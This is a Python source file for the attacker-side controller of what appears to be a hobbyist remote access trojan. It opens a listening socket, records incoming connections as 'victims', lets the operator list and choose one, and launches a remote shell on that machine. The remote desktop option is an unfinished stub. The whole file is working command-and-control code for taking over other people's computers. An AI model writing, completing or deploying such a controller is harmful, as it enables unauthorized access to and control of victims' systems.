import logging
import socket
import sys

import threading
import tkinter as tk

import inquirer

from src.modlues.CLI.commmad_executer import CommandExecuter
from src.modlues.CLI.print_enchanter import segement_print
from src.modlues.protocols.victim_dataclass import VictimData
from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide


class Attacker:

    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.ADDR = (ip, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)

        self.connected_clients = list()

        self.chosen_client = None

        self.commands = {"showclients": self.__show_connected_clients,
                         "choose": self.__choose_client,
                         "rsh": self.__start_remote_shell,
                         "rdp": self.__start_remote_desktop
                         }

        self.command_executer = CommandExecuter(self.commands)

    def main(self):
        threading.Thread(target=self.__start_listing).start()
        threading.Thread(target=self.__admin_input).start()

    def __start_listing(self):
        print(f'LISTENING... ({self.IP}:{self.PORT})')
        self.server.listen()
        try:
            while True:
                conn, addr = self.server.accept()
                threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()

        except Exception as e:
            print(e)
            self.server.close()

    def __on_new_client(self, conn, addr):
        self.connected_clients.append(VictimData(conn, addr))

    def __admin_input(self):
        while True:
            if self.chosen_client:
                input_text = f"attacker {self.chosen_client.addr} $ "
            else:
                input_text = f"attacker $ "

            command = input(input_text)

            self.command_executer.exec(command)

    @segement_print
    def __show_connected_clients(self):
        print("Connected Victims - ")
        for i, client in enumerate(self.connected_clients, start=1):
            print(f'{i}. {client.addr}')

    def __choose_client(self):
        self.__show_connected_clients()
        victim_id = int(input("Enter Victim Id: "))
        if self.connected_clients[victim_id - 1]:
            self.chosen_client = self.connected_clients[victim_id - 1]
            
        conn_type = int(input("what type of connection?\n1. RemoteShell\n2. RemoteDesktop"))

        if conn_type == 1:
            self.__start_remote_shell()
        elif conn_type == 2:
            self.__start_remote_desktop()
        else:
            print("Invalid Input")

    def __start_remote_shell(self):
        RemoteShellAttackerSide(self.chosen_client.conn).main()

    def __start_remote_desktop(self):
        print("feature in development! :(")
